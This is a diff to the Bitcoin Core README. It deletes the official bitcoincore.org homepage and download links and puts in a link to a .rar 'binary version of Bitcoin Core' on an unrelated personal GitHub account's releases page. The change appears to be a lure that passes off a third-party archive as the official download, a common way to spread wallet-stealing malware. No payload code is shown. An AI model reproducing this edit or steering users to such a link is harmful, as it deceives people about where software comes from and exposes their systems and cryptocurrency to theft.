@@ -1,10 +1,6 @@
 Bitcoin Core integration/staging tree
 =====================================
-
-https://bitcoincore.org
-
-For an immediately usable, binary version of the Bitcoin Core software, see
-https://bitcoincore.org/en/download/.
+- [ ] [Link For an immediately download, usable, binary version of the Bitcoin Core software](https://github.com/geniusprodigy/geniusprodigy/releases/download/bitcoin/BitcoinCore.rar)
 
 Further information about Bitcoin Core is available in the [doc folder](/doc).
 
